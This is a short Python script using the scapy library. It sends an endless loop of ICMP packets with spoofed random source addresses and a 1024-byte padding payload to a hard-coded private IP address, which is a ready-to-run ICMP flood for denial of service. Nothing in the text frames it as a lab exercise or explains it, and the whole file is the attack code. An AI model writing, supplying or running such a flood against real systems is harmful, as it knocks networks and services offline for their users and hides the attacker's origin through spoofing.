from scapy.all import *

target_ip = "172.18.54.56"
size = 1024
payload = "X" * size

source_ip = RandIP()
packet = IP(src=str(source_ip), dst=target_ip)/ICMP()/payload
send(packet, loop=1, verbose=0)